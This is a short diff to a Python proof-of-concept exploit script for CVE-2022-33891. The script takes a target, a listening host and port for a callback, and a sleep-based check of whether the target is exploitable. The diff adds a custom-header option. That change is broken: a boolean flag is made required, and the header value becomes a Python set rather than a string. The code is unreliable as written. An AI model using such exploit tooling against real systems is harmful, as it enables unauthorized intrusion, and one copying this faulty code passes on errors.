@@ -13,11 +13,14 @@ parser.add_argument('-lh', '--listeninghost', help='Your listening host IP addre
 parser.add_argument('-lp', '--listeningport', help='Your listening host port.')
 parser.add_argument('--check', default=False, action="store_true", help="Checks if the target is exploitable with a sleep test")
 parser.add_argument('--verbose', default=False, action="store_true", help="Verbose mode")
+parser.add_argument('--header', action="store_true", help="Custom header", required=True)
 
 args = parser.parse_args()
 
+header = {args.header}
+
 headers = {
-    'User-Agent': 'CVE-2022-33891 POC',
+    'User-Agent': header,
 }
 
 # Colors :D
